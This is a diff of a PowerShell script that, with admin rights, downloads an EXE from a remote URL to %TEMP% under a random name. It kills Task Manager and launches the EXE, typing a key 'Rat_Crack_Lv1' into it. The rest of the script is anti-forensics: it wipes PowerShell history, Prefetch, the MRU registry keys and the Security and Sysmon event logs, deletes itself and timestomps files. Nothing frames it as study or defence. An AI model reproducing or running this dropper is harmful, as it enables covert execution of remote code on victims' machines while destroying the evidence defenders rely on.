@@ -14,18 +14,38 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     }
 }
 
-# === 1. Clear Temp Folder ===
-Write-Host "[+] Clearing %TEMP% folder..." -ForegroundColor Cyan
+# === Add Win32 API for window handling ===
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+
+public class Win32Window {
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    
+    [DllImport("user32.dll", SetLastError = true)]
+    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
+    
+    [DllImport("user32.dll")]
+    public static extern bool SetForegroundWindow(IntPtr hWnd);
+    
+    [DllImport("user32.dll")]
+    public static extern bool BringWindowToTop(IntPtr hWnd);
+}
+"@
+
+# === 1. Clear Temp ===
+Write-Host "[+] Clearing %TEMP%..." -ForegroundColor Cyan
 $tempDir = $env:TEMP
 try {
     Get-ChildItem -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
     Write-Host "[+] Temp cleared." -ForegroundColor Green
 }
 catch {
-    Write-Host "[!] Warning: Could not fully clear temp (files might be in use). Continuing..." -ForegroundColor Yellow
+    Write-Host "[!] Warning: Could not fully clear temp. Continuing..." -ForegroundColor Yellow
 }
 
-# === 2. Download EXE to %TEMP% with Random Name ===
+# === 2. Download EXE ===
 $randomGuid = [System.Guid]::NewGuid().ToString()
 $exeFileName = "$randomGuid.exe"
 $exePath = Join-Path $env:TEMP $exeFileName
@@ -35,62 +55,78 @@ try {
     $webClient = New-Object System.Net.WebClient
     $webClient.DownloadFile($exeUrl, $exePath)
     $webClient.Dispose()
-    
     if (Test-Path $exePath) {
         Write-Host "[+] Download successful." -ForegroundColor Green
     } else {
-        throw "File not found after download."
+        throw "File not found."
     }
 }
 catch {
-    Write-Host "[!] Failed to download EXE: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "[!] Failed to download: $($_.Exception.Message)" -ForegroundColor Red
     exit 1
 }
 
-# === 3. Pre-Cleanup: Kill existing target processes (optional) ===
-Write-Host "[+] Killing existing taskmgr and notepad processes to prevent conflicts..." -ForegroundColor Cyan
+# === 3. Kill conflict processes (optional) ===
+Write-Host "[+] Killing taskmgr/notepad..." -ForegroundColor Cyan
 foreach ($pName in @("taskmgr", "notepad")) {
     $procs = Get-Process -Name $pName -ErrorAction SilentlyContinue
     if ($procs) {
         foreach ($p in $procs) {
-            try {
-                Stop-Process -Id $p.Id -Force -ErrorAction Stop
-                Write-Host "[+] Killed $pName (PID: $($p.Id))" -ForegroundColor Green
-            } catch {
-                Write-Host "[!] Failed to kill $pName (PID: $($p.Id)): $($_.Exception.Message)" -ForegroundColor Yellow
-            }
+            try { Stop-Process -Id $p.Id -Force -ErrorAction Stop } catch {}
         }
     }
 }
 Start-Sleep -Seconds 1
 
-# === 4. Launch the EXE and send password via stdin ===
-Write-Host "[+] Launching EXE and sending password..." -ForegroundColor Yellow
+# === 4. Launch the EXE (visible) ===
+Write-Host "[+] Launching EXE..." -ForegroundColor Yellow
+$proc = Start-Process -FilePath $exePath -PassThru
 
-$password = "Rat_Crack_Lv1"
+# Wait for the window to appear
+Start-Sleep -Seconds 3
 
-# Create process with redirected standard input
-$psi = New-Object System.Diagnostics.ProcessStartInfo
-$psi.FileName = $exePath
-$psi.UseShellExecute = $false          # Required for redirect
-$psi.RedirectStandardInput = $true     # We will write to stdin
-$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden   # Hide window (optional)
+# === 5. Bring the window to foreground and send the license key ===
+Write-Host "[+] Sending license key via SendKeys..." -ForegroundColor Yellow
 
-$proc = [System.Diagnostics.Process]::Start($psi)
+# Try to find the window by its title (adjust if the title is different)
+# You can also use the process's MainWindowHandle directly
+$hwnd = $proc.MainWindowHandle
+if ($hwnd -eq [IntPtr]::Zero) {
+    # Fallback: search by window title (guess "SKYNET" or "DEMOSHOP")
+    $hwnd = [Win32Window]::FindWindow($null, "SKYNET - DEMOSHOP")
+    if ($hwnd -eq [IntPtr]::Zero) {
+        $hwnd = [Win32Window]::FindWindow($null, "DEMOSHOP")
+    }
+}
 
-# Wait a moment for the EXE to be ready (adjust if needed)
-Start-Sleep -Milliseconds 500
+if ($hwnd -ne [IntPtr]::Zero) {
+    # Bring to foreground
+    [Win32Window]::SetForegroundWindow($hwnd) | Out-Null
+    [Win32Window]::BringWindowToTop($hwnd) | Out-Null
+    Start-Sleep -Milliseconds 500
+} else {
+    Write-Host "[!] Could not find window. Sending keys anyway (may type elsewhere)." -ForegroundColor Yellow
+}
 
-# Write the password and then a newline (Enter)
-$proc.StandardInput.WriteLine($password)
-$proc.StandardInput.Close()   # Close stdin – some programs need this
+# Add the required assembly for SendKeys
+Add-Type -AssemblyName System.Windows.Forms
 
-Write-Host "[+] Password sent." -ForegroundColor Green
+# The license key
+$licenseKey = "Rat_Crack_Lv1"
 
-# === 5. Enhanced Cleanup & Anti-Forensics ===
+# Send the key + Enter
+[System.Windows.Forms.SendKeys]::SendWait($licenseKey)
+[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
+
+Write-Host "[+] License key sent." -ForegroundColor Green
+
+# Optional: Hide the window after sending (0 = SW_HIDE)
+# [Win32Window]::ShowWindow($hwnd, 0) | Out-Null
+
+# === 6. Enhanced Cleanup & Anti-Forensics ===
 Write-Host "[+] Starting deep cleanup..." -ForegroundColor Cyan
 
-# 1. Clear PowerShell History (Memory & File Content)
+# 1. Clear PowerShell History
 [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() 2>$null
 $histPath = (Get-PSReadLineOption).HistorySavePath
 if (Test-Path $histPath) { 
@@ -110,11 +146,11 @@ $jumpListPaths = @(
 )
 foreach ($path in $jumpListPaths) {
     if (Test-Path $path) {
-        Get-ChildItem -Path $path -Force -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+        Get-ChildItem -Path $path -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
     }
 }
 
-# 4. Clear Prefetch (Multiple Attempts to Catch Re-created Files)
+# 4. Clear Prefetch
 $prefetchPath = "C:\Windows\Prefetch"
 for ($i = 0; $i -lt 3; $i++) {
     Start-Sleep -Seconds 1
@@ -123,17 +159,16 @@ for ($i = 0; $i -lt 3; $i++) {
     }
 }
 
-# 5. Clear INetCache (IE/Edge Cache)
+# 5. Clear INetCache
 $ieCache = Join-Path $env:LOCALAPPDATA "Microsoft\Windows\INetCache"
 if (Test-Path $ieCache) {
     Get-ChildItem -Path $ieCache -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
 }
 
-# 6. Clear Temp Folder Again (in case anything was recreated)
-$tempDir = $env:TEMP
+# 6. Clear Temp again
 Get-ChildItem -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
 
-# 7. Clear Registry MRU Keys (User-specific)
+# 7. Clear Registry MRU
 $mruKeys = @(
     "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
     "HKCU:\Software\Microsoft\Windows\ShellNoRoam\BagMRU",
@@ -146,17 +181,13 @@ foreach ($key in $mruKeys) {
     }
 }
 
-# 8. Clear Event Logs (Requires Admin)
+# 8. Clear Event Logs
 $logNames = @("Application", "Security", "System", "Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-Sysmon/Operational")
 foreach ($logName in $logNames) {
-    try {
-        wevtutil cl $logName 2>$null
-    } catch {
-        # Ignore errors if log doesn't exist or access denied
-    }
+    try { wevtutil cl $logName 2>$null } catch {}
 }
 
-# 9. Delete the downloaded EXE from Temp
+# 9. Delete the downloaded EXE
 Start-Sleep -Seconds 2
 if (Test-Path $exePath) { 
     try { Remove-Item $exePath -Force -ErrorAction SilentlyContinue } catch {}
@@ -167,12 +198,12 @@ if ($PSCommandPath -and (Test-Path $PSCommandPath)) {
     Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue 
 }
 
-# 11. Force GC and wait a bit to let system settle
+# 11. Force GC
 [GC]::Collect()
 Start-Sleep -Seconds 2
 
-# === 12. Timestomp PowerShell History and Folders ===
-Write-Host "[+] Timestomping PowerShell history and related folders..." -ForegroundColor Cyan
+# 12. Timestomp PowerShell history
+Write-Host "[+] Timestomping..." -ForegroundColor Cyan
 $timestompCmd = @'
 $inst = (Get-Item C:\Windows).CreationTime
 $diff = ((Get-Date) - $inst).TotalDays
